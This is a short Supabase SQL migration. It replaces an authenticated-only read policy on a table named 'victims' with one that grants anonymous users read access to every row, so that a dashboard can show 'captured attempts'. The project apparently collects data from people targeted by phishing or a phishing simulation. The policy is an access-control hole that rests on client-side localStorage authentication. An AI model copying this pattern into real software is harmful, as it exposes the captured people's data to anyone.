-- Fix RLS policy for victims table to allow anon read access for dashboard
-- This is needed because admin authentication is handled via localStorage, not Supabase auth

-- Drop the existing policy that only allows authenticated users
DROP POLICY IF EXISTS "Allow authenticated read for dashboard" ON victims;

-- Create a new policy that allows anon users to read victims data
-- This enables the dashboard to display captured attempts
CREATE POLICY "Allow anon read for dashboard"
  ON victims
  FOR SELECT
  TO anon
  USING (true);
